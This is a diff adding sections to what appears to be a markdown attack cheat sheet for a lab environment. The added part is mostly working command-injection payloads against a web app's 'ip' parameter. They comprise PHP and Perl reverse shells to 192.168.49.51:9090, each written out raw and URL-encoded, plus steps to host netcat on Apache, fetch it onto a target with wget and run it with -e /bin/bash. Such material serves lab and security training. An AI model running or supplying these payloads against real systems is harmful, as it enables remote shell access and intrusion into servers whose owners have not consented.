@@ -277,6 +277,71 @@ http://ci-sandbox:80/nodejs/index.js?ip=127.0.0.1|echo%20%22require(%27child_pro
 
 #### PHP
 
+```shell
+nc -nlvp 9090
+```
+
+```shell
+http://ci-sandbox/php/index.php?ip=127.0.0.1;php -r "system(\"bash -c 'bash -i >& /dev/tcp/192.168.49.51/9090 0>&1'\");"
+```
+
+```shell
+http://ci-sandbox/php/index.php?ip=127.0.0.1;php%20-r%20%22system(%5C%22bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.49.51%2F9090%200%3E%261%27%5C%22)%3B%22
+```
+
+#### Perl
+
+```shell
+perl -e 'use Socket;$i="192.168.49.51";$p=9090;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+
+```shell
+use Socket;
+$i="192.168.49.51";
+$p=9090;
+
+socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
+
+if(connect(S,sockaddr_in($p,inet_aton($i)))) {
+     open(STDIN,">&S");
+     open(STDOUT,">&S");
+     open(STDERR,">&S");
+     exec("/bin/sh -i");
+}
+```
+
+```shell
+http://ci-sandbox/nodejs/index.js?ip=127.0.0.1|perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.49.51%22%3B%24p%3D9090%3Bsocket(S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname(%22tcp%22))%3Bif(connect(S%2Csockaddr_in(%24p%2Cinet_aton(%24i))))%7Bopen(STDIN%2C%22%3E%26S%22)%3Bopen(STDOUT%2C%22%3E%26S%22)%3Bopen(STDERR%2C%22%3E%26S%22)%3Bexec(%22%2Fbin%2Fsh%20-i%22)%3B%7D%3B%27
+```
+
+#### File transfer
+
+```shell
+sudo cp /bin/nc /var/www/html/
+```
+
+```shell
+sudo service apache2 start
+```
+
+```shell
+wget http://192.168.49.51:80/nc -O /var/tmp/nc ; chmod 755 /var/tmp/nc ; /var/tmp/nc -nv 192.168.49.51 9090 -e /bin/bash
+```
+
+```shell
+wget%20http://192.168.49.51:80/nc%20-O%20/var/tmp/nc%20;%20chmod%20755%20/var/tmp/nc%20;%20/var/tmp/nc%20-nv%20192.168.49.51%209090%20-e%20/bin/bash
+```
+
+```shell
+nc -nlvp 9090
+```
+
+![alt text](https://res.cloudinary.com/dqrcefije/image/upload/v1749448244/web-attack/explicit_checks.png)
+
+##### windows
+![alt text](https://res.cloudinary.com/dqrcefije/image/upload/v1749448244/web-attack/explicit_checks_windows.png)
+
+---
 
 # 🔄 Alternatives to `base64` Binary (Encode/Decode)
 
